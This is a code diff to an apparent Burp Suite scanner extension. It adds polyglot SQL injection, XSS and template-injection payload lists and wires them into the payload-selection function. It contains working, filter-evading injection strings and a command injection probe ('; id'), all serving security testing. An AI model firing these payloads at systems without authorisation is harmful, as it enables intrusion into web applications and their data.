@@ -2841,6 +2841,12 @@ class BurpExtender(
                 "\" AND SLEEP(2)--",
                 "\\\" OR \\\"1\\\"=\\\"1",
             ],
+            "sqli_polyglot": [
+                "SLEEP(1) /*' or SLEEP(1) or'\" or SLEEP(1) or \"*/",
+                "'/**/OR/**/1=1/**/--/**/",
+                "' OR '1'='1' --",
+                "' OR '1'='1' /*",
+            ],
             "xss": [
                 "<script>confirm(1)</script>",
                 "\"><img src=x onerror=confirm(1)>",
@@ -2859,6 +2865,18 @@ class BurpExtender(
             "xss_attr": [
                 "\" autofocus onfocus=confirm(1) x=\"",
                 "' onmouseover='confirm(1)' x='",
+            ],
+            "xss_polyglot": [
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+                "\"><script>alert(1)</script>",
+                "'><img src=x onerror=alert(1)>",
+                "'\";!--\"<XSS>=&{()}",
+                "';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+                "'\"><marquee><img src=x onerror=confirm(1)></marquee></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script><isindex formaction=javascript:alert(/XSS/) type=submit>",
+                "\"onclick=alert(1)//<button' onclick=alert(1)//>*/alert(1)//",
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+                "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*<svg/*/onload=alert()//>",
+                "javascript:alert()//'/*`/*\"/**/;alert()//%0D%0A-->'>\"></title></textarea></style></noscript></noembed></template></select><svg/oNloAd=alert()><FRAME onload=alert()></script>\\\";alert()//<svg/oNloAd=alert()>",
             ],
             "command_injection": [
                 "; id",
@@ -2961,6 +2979,10 @@ class BurpExtender(
                 "<%= 7*7 %>",
                 "<%= ENV.to_h %>",
             ],
+            "ssti_polyglot": [
+                "${{<%[%'\"}}%\\",
+                "{{7*7}}${7*7}<%=7*7%>#{7*7}",
+            ],
             "generic": [
                 "scv-probe-{{NONCE}}",
                 "'\"`<scv-{{NONCE}}>",
@@ -2969,12 +2991,17 @@ class BurpExtender(
                 "\";print('{{NONCE}}');//",
                 "%3Cscv%3E{{NONCE}}%3C/scv%3E",
             ],
+            "generic_polyglot": [
+                "'-\"#*/",
+            ],
         }
 
     def _get_library_payloads_for_family(self, vuln_family, target_profile=None):
         library = self.advanced_payload_library or {}
         generic = list(library.get("generic", []))
         specific = list(library.get(vuln_family, []))
+        family_polyglot = list(library.get(vuln_family + "_polyglot", []))
+        generic_polyglot = list(library.get("generic_polyglot", []))
         context_specific = []
 
         if not target_profile:
@@ -3029,8 +3056,8 @@ class BurpExtender(
                 context_specific.extend(list(library.get(stack_key, [])))
 
         if vuln_family == "generic":
-            return generic
-        return context_specific + specific + generic
+            return family_polyglot + generic + generic_polyglot
+        return context_specific + specific + family_polyglot + generic + generic_polyglot
 
     def _replace_payload_placeholders(self, payload, verification_nonce="", oob_domain=""):
         value = str(payload or "")
